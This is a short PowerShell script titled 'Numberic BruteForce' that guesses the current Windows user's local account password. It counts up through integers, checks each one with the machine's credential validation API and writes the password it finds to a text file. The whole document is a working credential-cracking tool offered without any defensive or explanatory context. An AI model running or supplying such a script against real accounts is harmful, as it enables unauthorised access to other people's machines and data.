#Numberic BruteForce
$p=0
while($true){
	$u = $env:USERNAME
	$p = $p+1
	Add-Type -AssemblyName System.DirectoryServices.AccountManagement
	$t = [DirectoryServices.AccountManagement.ContextType]::Machine
	$a = [DirectoryServices.AccountManagement.PrincipalContext]::new($t)
	$final = $a.ValidateCredentials($u,$p)
	if($final -eq "True"){
	write-host Password Found: -foreground green $p 
	$p >> Password_Found.txt
	break
	}
	write-host Password In Cracking: -foreground Red $p
	continue
}
